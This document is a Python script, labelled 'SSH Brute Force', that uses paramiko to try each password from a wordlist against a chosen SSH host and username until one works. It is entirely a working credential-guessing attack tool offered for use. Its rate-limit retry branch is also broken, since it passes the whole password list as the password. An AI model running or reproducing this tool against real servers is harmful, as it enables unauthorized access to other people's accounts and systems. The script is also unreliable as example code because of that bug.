#!/bin/python3
import paramiko
import argparse
import time
import socket
from termcolor import colored
from termcolor import cprint

parser = argparse.ArgumentParser(description="SSH Brute Force")
parser.add_argument("-t", "--target", type=str, required=True, help="IP Of target")
parser.add_argument("-p", "--port", type=int, required=True, help="Port To Connect Too")
parser.add_argument("-w", "--wordlist", type=str, required=True, help="Wordlist To Use")
parser.add_argument("-u", "--user", type=str, required=True, help="Username To Use")

args = parser.parse_args()

host = args.target
port = args.port
name = args.user
wordlist = args.wordlist


def fail():
    print("[", end="")
    cprint("!", 'red', attrs=['bold'], end="")
    print("]", end=" ")

def done():
    print("[", end="")
    cprint("!", 'green', attrs=['bold'], end="")
    print("]", end=" ")


def check(host, user, passw):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname=host, username=user, password=passw, timeout=3)

    except socket.timeout:
        print("Failed to Connect Check If Host Is Up")
        return False

    except paramiko.AuthenticationException:
        fail()
        print(f"Invalid Creds:", end="")
        cprint(f" {user}", 'red', end="")
        print(":", end="")
        cprint(f"{passw}", 'red')
        return False

    except paramiko.SSHException as e:
        print("[!] Qouta Exceded Trying Again In 15 Seconds")
        time.sleep(15)
        return check(host, name, passlist)

    else:
        done()
        print("Found Right Creds: ", end='')
        cprint(user, 'green', attrs=['bold'], end="")
        print(":", end="")
        cprint(passw, 'green', attrs=['bold'])
        return True


passlist = open(wordlist).read().split("\n")




for passes in passlist:
    if check(host, name, passes):
        break

        
